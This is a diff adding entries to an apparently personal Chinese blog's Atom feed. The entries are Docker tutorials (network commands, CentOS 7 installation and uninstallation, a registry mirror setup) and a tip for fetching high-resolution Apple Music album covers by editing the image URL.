+CMD				#容器启动时需要运行的命令,只有最后一个生效,可被替换
+ENTRYPOINT		#容器启动时需要运行的命令,可以追加命令	
+ENV				#构建的时候设置环境变量
+</code></pre>
+<br>
+<h2 id="docker-网络命令">Docker 网络命令</h2>
+<br>
+<br>
+<h3 id="docker-network">docker network</h3>
+<pre><code class="language-shell">docker network --help
+
+Usage:	docker network COMMAND
+
+Manage networks
+
+Commands:
+  connect     Connect a container to a network
+  create      Create a network
+  disconnect  Disconnect a container from a network
+  inspect     Display detailed information on one or more networks
+  ls          List networks
+  prune       Remove all unused networks
+  rm          Remove one or more networks
+  
+#查看docker 网络适配器模式
+docker network ls
+
+NETWORK ID          NAME                DRIVER              SCOPE
+8c61b8c764f6        bridge              bridge              local
+0fb588f08568        host                host                local
+58d6ff1f424f        none                null                local
+bridge		桥接模式
+host		共享宿主机网络模式
+none		不配置网络
+
+#创建docker 网络适配器 test-net
+docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 test-net
+--driver 		网络适配器模式,默认为bridge
+--subnet		子网掩码配置
+--gateway		网关配置
+
+#删除docker 网络适配器 test-net
+docker network rm test-net 
+
+#为容器添加网络适配器,tomcat01_birdge的网络适配器为默认docker01
+docker network connect test-net tomcat01_birdge 
+
+
+
+</code></pre>
+<br>
+<h2 id="docker-其他命令">Docker 其他命令</h2>
+<br>
+<br>
+<h3 id="docker-info显示-docker-系统信息包括镜像和容器数">docker info		显示 Docker 系统信息，包括镜像和容器数</h3>
+<br>
+<h3 id="docker-version显示-docker-版本信息">docker version		显示 Docker 版本信息</h3>
+<br>
+<h3 id="docker-stats显示docker容器占用系统资源情况">docker stats		显示Docker容器占用系统资源情况</h3>
+<br>
+<h3 id="docker-login登录docker">docker login		登录Docker</h3>
+<pre><code class="language-shell">docker login -u &quot;你的用户名&quot; -p &quot;你的密码&quot;
+</code></pre>
+<br>
+<h3 id="docker-logout退出docker">docker logout		退出Docker</h3>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Docker保姆级教程 : Install Docker]]></title>
+        <id>https://M0kY4n.github.io111/post/docker-an-zhuang-jiao-cheng/</id>
+        <link href="https://M0kY4n.github.io111/post/docker-an-zhuang-jiao-cheng/">
+        </link>
+        <updated>2020-06-27T03:48:55.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="docker安装教程">Docker安装教程</h1>
+<blockquote>
+<p>Docker官方手册 :https://docs.docker.com/</p>
+</blockquote>
+<br>
+<h2 id="系统环境">系统环境</h2>
+<blockquote>
+<p>此文章演示的版本为Linux版本,系统为CentOS 7,官方手册明确说明:</p>
+<p>​	若要在CentOS上安装Docker,则需要一个CentOS 7的维护版本。不支持或未测试存档版本。</p>
+</blockquote>
+<pre><code class="language-shell">#系统版本信息
+[root@localhost ~]# cat /etc/os-release 
+NAME=&quot;CentOS Linux&quot;
+VERSION=&quot;7 (Core)&quot;
+ID=&quot;centos&quot;
+ID_LIKE=&quot;rhel fedora&quot;
+VERSION_ID=&quot;7&quot;
+PRETTY_NAME=&quot;CentOS Linux 7 (Core)&quot;
+ANSI_COLOR=&quot;0;31&quot;
+CPE_NAME=&quot;cpe:/o:centos:centos:7&quot;
+HOME_URL=&quot;https://www.centos.org/&quot;
+BUG_REPORT_URL=&quot;https://bugs.centos.org/&quot;
+
+CENTOS_MANTISBT_PROJECT=&quot;CentOS-7&quot;
+CENTOS_MANTISBT_PROJECT_VERSION=&quot;7&quot;
+REDHAT_SUPPORT_PRODUCT=&quot;centos&quot;
+REDHAT_SUPPORT_PRODUCT_VERSION=&quot;7&quot;
+
+</code></pre>
+<p>安装之前确保系统没有安装过旧版本的Docker,若有安装执行以下命令卸载旧版本的Docker</p>
+<pre><code class="language-shell">$ sudo yum remove docker \
+                  docker-client \
+                  docker-client-latest \
+                  docker-common \
+                  docker-latest \
+                  docker-latest-logrotate \
+                  docker-logrotate \
+                  docker-engine
+                  
+</code></pre>
+<br>
+<br>
+<h2 id="安装docker">安装Docker</h2>
+<blockquote>
+<p>安装Docker之前,需要设置Docker存储库</p>
+</blockquote>
+<pre><code class="language-shell">#设置存储库需安装yum-utils包
+yum install -y yum-utils
+
+#设置存储库 , 默认为官方国外地址!!!,若网络状态不好请自行更换国内源
+yum-config-manager \
+    --add-repo \
+    https://download.docker.com/linux/centos/docker-ce.repo    
+    
+#更新源
+yum makecache fast
+
+</code></pre>
+<blockquote>
+<p>安装Docker</p>
+</blockquote>
+<pre><code class="language-shell"> #安装最新的Docker
+ yum -y install docker-ce docker-ce-cli containerd.io
+ 
+</code></pre>
+<br>
+<br>
+<h2 id="启动运行-docker">启动&amp;运行 Docker</h2>
+<pre><code class="language-shell">#启动Docker
+systemctl start docker
+
+#运行Hello-world镜像来测试是否正确安装了Docker
+docker run hello-world
+
+#显示以下信息则正确安装了Docker
+
+Hello from Docker!
+This message shows that your installation appears to be working correctly.
+
+To generate this message, Docker took the following steps:
+ 1. The Docker client contacted the Docker daemon.
+ 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.
+    (amd64)
+ 3. The Docker daemon created a new container from that image which runs the
+    executable that produces the output you are currently reading.
+ 4. The Docker daemon streamed that output to the Docker client, which sent it
+    to your terminal.
+
+To try something more ambitious, you can run an Ubuntu container with:
+ $ docker run -it ubuntu bash
+
+Share images, automate workflows, and more with a free Docker ID:
+ https://hub.docker.com/
+
+For more examples and ideas, visit:
+ https://docs.docker.com/get-started/
+
+</code></pre>
+<br>
+<br>
+<h2 id="卸载docker">卸载Docker</h2>
+<pre><code class="language-shell">#卸载Docker
+yum remove docker-ce docker-ce-cli containerd.io
+
+#删除主机上的残余文件(镜像,容器,配置文件等等)
+rm -rf /var/lib/docker
+</code></pre>
+<br>
+<br>
+<h1 id="配置国内镜像加速">配置国内镜像加速</h1>
+<blockquote>
+<p>使用国内镜像加速能更快的下载镜像,这里以腾讯云为例,其他运行商请自行找到各自的文档进行配置</p>
+</blockquote>
+<pre><code class="language-shell">#打开 /etc/docker/daemon.json 配置文件(这个文件是本身是不存在的,只是通过vim创建-编辑-保存-生成)
+vim /etc/docker/daemon.json
+
+#进入vim的编辑模式,添加一下内容,并保存
+{
+&quot;registry-mirrors&quot;: [&quot;https://mirror.ccs.tencentyun.com&quot;]
+}
+
+#重新加载服务配置文件
+systemctl daemon-reload 
+
+#重启Docker进程
+systemctl restart docker
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[上网冲浪小技巧——下载高清专辑封面]]></title>
+        <id>https://M0kY4n.github.io111/post/gao-qing-zhuan-ji-feng-mian/</id>
+        <link href="https://M0kY4n.github.io111/post/gao-qing-zhuan-ji-feng-mian/">
+        </link>
+        <updated>2020-06-23T18:21:46.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>说明:并非所有专辑都收录且并非所有专辑能下载到高清</p>
+<p>开始之前,先喊苹果牛逼!!!苹果永远滴神!!!</p>
+</blockquote>
+<br>
+# 搜索专辑
+<p>打开网站 https://music.apple.com/cn/browse<br>
+点击搜索栏,输入想要搜索的专辑(并非收录所有专辑,所以可能存在找不到专辑的情况),这里以&quot;Shiga的《大了一岁》“为例</p>
+<figure data-type="image" tabindex="1"><img src="https://file.moetu.org/images/2020/06/24/image-20200624013925007546db20cf0e3d4fa.png" alt="搜索结果" loading="lazy"></figure>
+<br>
+<h1 id="获取专辑封面url">获取专辑封面URL</h1>
+<h2 id="1右击获取专辑封面url">1,右击获取专辑封面URL</h2>
+<p>右击专辑封面图,选择“复制图片地址”或者“在新标签页中打开图片”</p>
+<figure data-type="image" tabindex="2"><img src="https://file.moetu.org/images/2020/06/24/image-202006240142075745292874e747cf154.png" alt="右击菜单" loading="lazy"></figure>
+<h2 id="2通过document-element专辑封面url">2.通过Document Element专辑封面URL</h2>
+<p>输入“F12”打开开发者工具，输入“Ctrl+Shift+C”，选中并点击专辑封面</p>
+<figure data-type="image" tabindex="3"><img src="https://file.moetu.org/images/2020/06/24/image-202006240148176464ca238639c766293.png" alt="选中图片" loading="lazy"></figure>
+<p>在HTML代码中找到专辑封面URL</p>
+<figure data-type="image" tabindex="4"><img src="https://file.moetu.org/images/2020/06/24/image-202006240152207087321254865fd4b75.png" alt="专辑封面URL" loading="lazy"></figure>
+<h2 id="3修改专辑封面url获取高清专辑封面">3.修改专辑封面URL获取高清专辑封面</h2>
+<p>观察专辑封面URL的地址,不同分辨率,URL也跟着变化</p>
+<pre><code class="language-shell"># 1000w的分录率,URL最后的1000x1000bb.jpg
+https://is2-ssl.mzstatic.com/image/thumb/Music49/v4/2a/9e/37/2a9e371c-e1e8-b89e-5d79-63ddc1b2039e/825646018468.jpg/1000x1000bb.jpg  
+</code></pre>
+<p>所以,将URL最后的 XXX * XXXbb.jpg 将XXX增大,封面的清晰度随着XXX增大而清晰,这里我们将XXX设置为5000</p>
+<p>则专辑封面URL为</p>
+<pre><code class="language-shell">https://is2-ssl.mzstatic.com/image/thumb/Music49/v4/2a/9e/37/2a9e371c-e1e8-b89e-5d79-63ddc1b2039e/825646018468.jpg/5000x5000bb.jpg
+</code></pre>
+<p>修改后回车访问,图片会重新加载,可见随着分辨率增大,图片加载速度变慢</p>
+<figure data-type="image" tabindex="5"><img src="https://file.moetu.org/images/2020/06/24/image-20200624015819987185234ba096f4a89.png" alt="加载图片" loading="lazy"></figure>
+<p>加载完毕后,可用鼠标单击缩放图片</p>
+<figure data-type="image" tabindex="6"><img src="https://file.moetu.org/images/2020/06/24/image-20200624020026662ed44e78bcd43cf0f.png" alt="缩放图片" loading="lazy"></figure>
+<p>将图片下载下来,查看属性发现图片分辨率并不是5000x5000.而是4000x4000的!!所以基本确定4000是服务器上最大分辨率,所以下载专辑封面的时候,尽量将URL的分辨率数值设大,让服务器以最大分辨率解析</p>
+<figure data-type="image" tabindex="7"><a href="https://moetu.org/image/7dAOY"><img src="https://file.moetu.org/images/2020/06/24/_2020062402064732b6748dd71ebbb4.png" alt="文件属性" loading="lazy"></a></figure>
+<br>
+<h2 id="总结">总结</h2>
+<ol>
+<li>Apple Music并非收录所有专辑,所以会存在找不到专辑的情况</li>
+<li>Apple Music的专辑封面分辨率是固定的,下载专辑封面的时候,尽量将URL的分辨率数值设大,让服务器以最大分辨率解析</li>
+<li>Apple Music属于国外网站,国内网络状态较差的,请自行科学上网访问<br>
+<br></li>
+</ol>
+<h2 id="专辑封面">专辑封面</h2>
+<figure data-type="image" tabindex="8"><img src="https://file.moetu.org/images/2020/06/24/5000x5000bb7f1d2a647178de79.jpg" alt="Shiga《大了一岁》封面" loading="lazy"></figure>
+]]></content>
+    </entry>
+</feed>
